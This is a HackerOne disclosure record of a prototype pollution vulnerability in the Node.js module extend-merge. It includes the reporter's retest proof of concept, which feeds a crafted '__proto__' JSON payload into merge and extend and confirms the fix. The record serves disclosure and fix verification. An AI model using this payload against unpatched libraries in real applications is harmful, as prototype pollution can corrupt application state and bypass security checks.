---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/modification-of-assumed-immutable-data-maid
  - env/web
  - stack/node
substate: "resolved"
weakness: "Modification of Assumed-Immutable Data (MAID)"
enriched: true
date: 2020-09-06
submitted: 2020-05-19T19:34:31.760Z
bounty_usd: null
votes: 5
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "d3lla"
source: "https://hackerone.com/reports/878339"
title: "[extend-merge] Prototype pollution"
---
# [extend-merge] Prototype pollution

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 5 | **Program:** Node.js third-party modules | **Disclosed:** 2020-09-06

- Report: [https://hackerone.com/reports/878339](https://hackerone.com/reports/878339)
- CWE: Modification of Assumed-Immutable Data (MAID)
- Submitted: 2020-05-19T19:34:31.760Z

## Timeline

- **Report Filed**
- **2020-05-19** @nochnoidozor: Hi @d3lla,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@nochnoidozor
- **Report Triaged**
- **External User Joined**
- **2020-08-31** @jails: Thank you for the detailed report.
The issue has been fixed in the last release.
- **2020-09-03** @d3lla: Hi @jails,

thanks for your reply and for the fix.

Your changes seems to fix the problem.  I run the following poc:
```javascript
const extend_merge = require('extend-merge');
const payload =  JSON.parse('{"__proto__":{"polluted":"yes"}}');
let obj = {};
console.log("Before : " + obj.polluted);
extend_merge.merge({}, payload);
console.log("After : " + obj.polluted);
extend_merge.extend({}, payload);
console.log("After : " + obj.polluted);
```
and I was not able to reproduce the previous reported result.  Now I obtain:
```
Before : undefined
After : undefined
After : undefined
```
{F975319}

Thanks for your time and have a nice day, 
d3lla

I tested using the following configurations:
* OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
* NODEJS VERSION: v14.8.0
* NPM VERSION: 6.14.7
- **2020-09-03** @jails: Awesome, thank you for your time !
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
